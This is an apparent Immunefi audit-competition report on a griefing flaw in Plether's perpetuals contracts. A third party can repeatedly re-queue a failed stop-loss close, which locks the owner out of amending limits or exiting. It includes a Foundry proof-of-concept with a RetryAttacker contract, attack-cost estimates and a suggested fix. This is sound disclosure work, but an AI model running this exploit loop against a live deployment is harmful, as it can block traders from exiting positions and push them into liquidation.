# \#98891 [SC-High]   Permissionless retryPositionProtectionClose lets a third party re-queue a failed protection close in the same transaction, blocking the owner's documented amend and every exit from the position

**Submitted on Nov 10th 2026 at 19:03:29 UTC by @Nyko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98891
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

  When a triggered protection close fails on one of the owner's close ceilings, the protection becomes `Latched` and, per the documentation, "the owner may amend its limits before retrying". The amend only works while the protection is `Latched` with no pending order. `retryPositionProtectionClose` is permissionless and accepts the same state. Any caller can end the live close attempt (`executeOrder`, or `expireOrder` after its deadline) and call `retryPositionProtectionClose` in the same transaction. The protection is `Triggered` again with a new attempt that carries the same ceilings, so the owner's amend, cancel, cancel-and-close and own close commit all revert. Repeated once per attempt, this prevents the owner from changing the ceilings or closing the position while the price stays outside the ceiling. The amend gate was added by the MED-9 fix (8a2853f).

  ## Vulnerability Details

  States: `Armed` (waiting for the trigger), `Triggered` (one live close attempt), `Latched` (last attempt failed, none live).

  1. A failed attempt relatches inside the transaction that ends it (`PositionProtectionBook.sol:662-667`):

  ```solidity
  delete _attemptProtectionIds[orderId];
  retained = _positionMatches(protection);
  ...
  if (retained) {
      protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
  ```

  Every terminal reason except `None`, `Executed`, `RiskOff` and `AccountLiquidated` is a failure (`:1017-1022`), so `ConstraintViolation` and `Expired` both relatch.

  2. Retry has no caller check: it uses `_activeProtection`, not `_ownedActiveProtection` (`:385-394`):

  ```solidity
  StoredProtection storage protection = _activeProtection(protectionId);
  if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
      revert OrderRouter__ProtectionNotLatched();
  }
  ...
  if (router.pendingOrderCounts(protection.account) != 0) {
  ```

  It queues a new attempt and sets the status back to `Triggered` (`_recordCloseAttempt`, `:572-574`).

  3. The owner's amend requires the state that the retry has just removed (`:319-325`):

  ```solidity
  StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
  if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
      revert OrderRouter__ProtectionNotLatched();
  }
  if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
  ```

  4. Each new attempt copies the same owner ceilings (`router/OrderLiquidationBatchLogic.sol:674-677`) with a zero bounty (`:205`). While the price stays outside the ceiling, every attempt fails again with `ConstraintViolation`.

  5. No other owner exit while `Triggered`: cancel and cancel-and-close require `PendingOpen` or `Armed` (`PositionProtectionBook.sol:414-419`, `:346-347`), and the owner's own close commit reverts with `OrderRouter__ProtectionActive` (`router/OrderLiquidationBatchLogic.sol:313-315`).

  6. Ending an attempt is permissionless: `executeOrder` runs the queue head for any caller, and `expireOrder` only checks `block.timestamp <= pending.timing.executionDeadline` (`OrderRecoverySidecar.sol:57-59`).

  Attack, one transaction per attempt: `executeOrder(child)` (or `expireOrder(child)` after the 60 s window), which fails and relatches, then `retryPositionProtectionClose(id)`. The `Latched` state with no pending order exists only inside the attacker's transaction, so the owner's amend never succeeds.

  ## Impact Details

  Selected impact: Medium, "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)".
  The owner's stop-loss fired, the market was past the owner's ceiling, and the close failed. The documented remedy (widen the ceiling, retry) is unavailable while the attacker repeats the cycle; the position stays open at full size and leverage. In the PoC the owner is blocked for 62 minutes (120 cycles) with the price between 1.008 and 1.030. If the price keeps moving against the owner, the position can be liquidated instead of closed at the loss the owner would accept: in a longer local run with the same setup, `previewLiquidation` reported the position (25x, release parameters) liquidatable at 1.0398, not at 1.01.

  Conditions and limits:
  - No attacker profit: retries pay no bounty (`OrderLiquidationBatchLogic.sol:205`), the trigger reward is paid once (`SECURITY.md:1356-1357`), and the attacker pays gas every cycle.
  - The starting condition depends on the market: the price must move far enough that the close exceeds one of the owner's ceilings (in the PoC the gross account debit ceiling, about 100 USDG realised loss at 1.01 against 75 USDG). With unlimited ceilings the first execution closes the position.
  - Smart-account owners can escape: an account that batches calls (the documented SimpleAccount v0.8 `executeBatch`, or an EIP-7702 EOA) ends the attempt, amends and retries in one transaction (`test_Control_SmartAccountBatchEscapes`). A plain EOA owner needs two transactions, and an attacker retry between them makes the amend revert (`test_EoaOwnerTwoTxEscapeLosesToBackrun`); if both are sequenced back to back, the owner escapes.
  - The attacker must act first on every attempt; in the PoC nobody else touches them. We also ran the loop in expiry mode (`expireOrder` after each 60 s window, then retry) for 24 hours of chain time: 1,417 cycles, amend reverted after every cycle. That run is uncontested and not included below (it needs a raised `--gas-limit`).
  - Once the price returns inside the ceiling, the next execution closes the position (end of `test_RetryLoopLocksVictimForOneHour`, at 1.004).
  - Cost: about 1.55 M gas per `RetryAttacker.executeAndRetry` call in the Foundry gas report (warm storage; a real transaction adds intrinsic gas, cold reads and the L1 data fee: about 1.6 to 2.5 M), so about 0.000016 to 0.000025 ETH per cycle at Arbitrum One's 0.01 gwei base fee. Letting each attempt expire needs one cycle per 60 s window: about 60 cycles, 0.001 to 0.0015 ETH, per hour. Executing each attempt early needs more cycles plus the Pyth fee.

  Why this is not the passive MED-9 residual ("tight limits may block execution until conditions improve or the owner amends them"):
  1. A third party keeps the owner's amend exit unavailable, although the documentation gives it to the owner: "protection becomes `Latched`; the owner may amend its limits before retrying" (`WORKING_WITH_AI_AGENTS.md:284`; also `CANONICAL_ENTRYPOINTS.md:145-147`).
  2. The team tells its own workers not to do this: "do not continuously queue the same failing attempt" (`DEPLOYMENT.md:419-421`). Nothing on chain enforces it, and keepers are untrusted under the program rules.
  3. The amend gate was added by the MED-9 fix (8a2853f). Before it, attempts had unlimited ceilings and could not fail on them, and the amend function did not exist.

  Related: Cecuro MED-30 (Medium) covered an owner whose own close is blocked by an active protection that cannot trigger in a frozen market. Its fix (2f53523) added the atomic exit `cancelPositionProtectionAndCommitClose`, which excludes `Triggered` and `Latched`, the states this issue keeps the owner in. The AI scan notes these states cannot be cancelled; this report concerns the documented amend path. The repository test `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry` has the owner amend before a third party retries; the reverse order is not covered.

  Recommended fix (either):
  - Accept `Triggered` in `amendLatchedPositionProtectionCloseLimits` and drop the pending-order check. The live attempt keeps its committed bounds; `_protectionCloseRequest` reads the new limits on the next retry, including one queued by a third party.

  ```solidity
  if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched
      && protection.status != PositionProtectionTypes.PositionProtectionStatus.Triggered) {
      revert OrderRouter__ProtectionNotLatched();
  }
  _setCloseLimits(protection, limits);
  ```

  - Or, after a `ConstraintViolation` relatch, let only the owner call `retryPositionProtectionClose` for a short window (for example one execution window); keep it permissionless after `Expired` and after the window.

  ## References

  Base URL: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/
  - https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L382-L406 (retry)
  - src/PositionProtectionBook.sol#L315-L328 (amend), #L637-L668 (relatch), #L1017-L1022 (failure reasons)
  - src/router/OrderLiquidationBatchLogic.sol#L313-L315 (owner close blocked), #L657-L680 (retry ceilings)
  - src/OrderRecoverySidecar.sol#L49-L59 (expireOrder)
  - WORKING_WITH_AI_AGENTS.md lines 283-284, DEPLOYMENT.md 419-421, CANONICAL_ENTRYPOINTS.md 145-147, SECURITY.md 1356-1359
  - Plether-Fi/plether-core commits 8a2853f (MED-9 fix) and 2f53523 (MED-30 fix)

## Proof of Concept

## Proof of Concept

Uses the repository's `BasePerpTest` (deployed protocol contracts; `MockPyth` supplies prices) with release risk parameters. No in-scope contract is modified. `router` is the repository's `LegacyOrderRouterHarness`; its scalar `commitOrder` calls the V3 `commitOrder`.

1. Save the file below as `packages/perps/test/perps/poc/ProtectionRetryLock.t.sol` at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8.
2. From the repository root: `forge test --root packages/perps --match-path test/perps/poc/ProtectionRetryLock.t.sol -vv --gas-report` (`FOUNDRY_VIA_IR=false` compiles faster).
3. Expected: 4 passed. The gas report row `RetryAttacker.executeAndRetry` is the attacker's gas per cycle.

- `test_FirstChildFailsOnOwnerCeiling`: no attacker; the attempt fails (`ConstraintViolation`), the owner amends, the retry closes.
- `test_RetryLoopLocksVictimForOneHour`: 120 cycles, 62 min; after each, amend, cancel and own close revert. At 1.004 the attempt executes.
- `test_EoaOwnerTwoTxEscapeLosesToBackrun`: a retry between the owner's two transactions makes the amend revert.
- `test_Control_SmartAccountBatchEscapes`: a batching account escapes in one transaction.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types as V3} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors as E} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions as IBook} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {PositionProtectionTypes as P} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// Unprivileged caller: ends the live protection child and queues a new one in one transaction.
contract RetryAttacker {
    function executeAndRetry(OrderRouter r, IBook b, uint64 id, uint64 child, bytes[] calldata d) external returns (uint64) {
        require(r.executeOrder(child, d).status == V3.LifecycleStatus.Failed);
        return b.retryPositionProtectionClose(id);
    }
}

/// Minimal batching account (SimpleAccount executeBatch, or an EIP-7702 EOA).
contract BatchAccount {
    address immutable owner = msg.sender;

    function executeBatch(address[] calldata to, bytes[] calldata data) external {
        require(msg.sender == owner);
        for (uint256 i; i < to.length; ++i) {
            (bool ok, bytes memory ret) = to[i].call(data[i]);
            if (!ok) assembly ("memory-safe") { revert(add(ret, 32), mload(ret)) }
        }
    }
}

contract ProtectionRetryLockTest is BasePerpTest {
    IBook book;
    RetryAttacker attacker = new RetryAttacker();
    address constant ALICE = address(0xA11CE);
    address constant ATTACKER = address(0xBAD);
    uint256 constant SIZE = 10_000e18; // LONG, 10,000 USDG notional, 400 USDG margin
    uint256 constant GAP = 101_000_000; // stop-loss at 1.005, market gaps to 1.01
    uint256 constant MAX = type(uint256).max;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams(1e16, 0.4e18, 10, 20, 300, 500, 1e6, 10, 5000, 0); // release values
    }

    function setUp() public override {
        super.setUp();
        book = IBook(address(router.positionProtectionBook()));
        _fundTrader(ALICE, 20_000e6);
        vm.warp(vm.getBlockTimestamp() + 1);
        router.updateMarkPrice(_live(1e8));
    }

    /// No attacker: the child fails on the owner's 75 USDG debit ceiling; the owner amends and exits.
    function test_FirstChildFailsOnOwnerCeiling() public {
        (uint64 id, uint64 child) = _armAndTrigger(ALICE);
        V3.ExecutionResult memory r = router.executeOrder(child, _nextBlock(5, GAP));
        assertEq(uint8(r.terminalReason), uint8(V3.TerminalReason.ConstraintViolation));
        assertEq(router.pendingOrderCounts(ALICE), 0); // Latched, no live child
        vm.prank(ALICE);
        book.amendLatchedPositionProtectionCloseLimits(id, _limits(MAX));
        _closes(ALICE, book.retryPositionProtectionClose(id), GAP);
    }

    /// 120 attacker cycles of 31 s (62 min), price 1.008 to 1.030; the owner is locked after each cycle.
    function test_RetryLoopLocksVictimForOneHour() public {
        (uint64 id, uint64 child) = _armAndTrigger(ALICE);
        uint256 start = vm.getBlockTimestamp();
        for (uint256 i; i < 120; ++i) {
            child = _attack(id, child, _nextBlock(30, 100_800_000 + (i * 7919) % 2_200_000));
            _assertOwnerLocked(id);
        }
        assertGe(vm.getBlockTimestamp() - start, 1 hours);
        _closes(ALICE, child, 100_400_000); // the lock ends once the price re-enters the ceiling
    }

    /// Plain EOA owner: tx1 ends the child, tx2 amends. A retry between them wins.
    function test_EoaOwnerTwoTxEscapeLosesToBackrun() public {
        (uint64 id, uint64 child) = _armAndTrigger(ALICE);
        bytes[] memory d = _nextBlock(5, GAP);
        vm.prank(ALICE);
        router.executeOrder(child, d); // tx1
        vm.prank(ATTACKER);
        book.retryPositionProtectionClose(id); // back-run
        vm.prank(ALICE);
        vm.expectRevert(E.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(id, _limits(MAX)); // tx2
    }

    /// Control: a batching owner ends the child, amends and retries in one transaction.
    function test_Control_SmartAccountBatchEscapes() public {
        BatchAccount acct = new BatchAccount();
        _fundTrader(address(acct), 20_000e6);
        (uint64 id, uint64 child) = _armAndTrigger(address(acct));
        child = _attack(id, child, _nextBlock(5, GAP));

        address[] memory to = new address[](3);
        bytes[] memory calls = new bytes[](3);
        (to[0], to[1], to[2]) = (address(router), address(book), address(book));
        calls[0] = abi.encodeCall(OrderRouter.executeOrder, (child, _nextBlock(5, GAP)));
        calls[1] = abi.encodeCall(book.amendLatchedPositionProtectionCloseLimits, (id, _limits(MAX)));
        calls[2] = abi.encodeCall(book.retryPositionProtectionClose, (id));
        uint64 fresh = router.nextCommitId();
        acct.executeBatch(to, calls);
        _closes(address(acct), fresh, GAP);
    }

    function _armAndTrigger(address owner) internal returns (uint64 id, uint64 child) {
        _open(owner, CfdTypes.Side.LONG, SIZE, 400e6, 1e8);
        P.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = 100_500_000;
        params.closeLimits = _limits(75e6);
        vm.prank(owner);
        id = book.createPositionProtection(params);
        _nextBlock(1, GAP);
        bytes[] memory live = _live(GAP);
        vm.prank(ATTACKER); // anyone may trigger
        child = book.triggerPositionProtection(id, live);
    }

    function _attack(uint64 id, uint64 child, bytes[] memory d) internal returns (uint64) {
        vm.prank(ATTACKER);
        return attacker.executeAndRetry(router, book, id, child, d);
    }

    function _assertOwnerLocked(uint64 id) internal {
        vm.startPrank(ALICE);
        vm.expectRevert(E.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(id, _limits(MAX));
        vm.expectRevert(E.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtection(id);
        vm.expectRevert(E.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true); // own close
        vm.stopPrank();
        assertEq(router.pendingOrderCounts(ALICE), 1);
    }

    function _closes(address owner, uint64 child, uint256 price) internal {
        assertEq(uint8(router.executeOrder(child, _nextBlock(5, price)).status), uint8(V3.LifecycleStatus.Executed));
        (uint256 size,,,,,,) = engine.positions(owner);
        assertEq(size, 0);
    }

    function _nextBlock(uint256 dt, uint256 price) internal returns (bytes[] memory) {
        vm.warp(vm.getBlockTimestamp() + dt);
        return _mockPythUpdateData(price); // next block, +1 s
    }

    function _limits(uint256 debitCeiling) internal pure returns (P.CloseFinancialLimits memory) {
        return P.CloseFinancialLimits(MAX, debitCeiling, MAX, MAX);
    }

    function _live(uint256 price) internal view returns (bytes[] memory d) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory u = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            u[i].id = ids[i];
            u[i].price = MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), engine.lastMarkTime());
        }
        d = new bytes[](1);
        d[0] = abi.encode(u);
    }
}
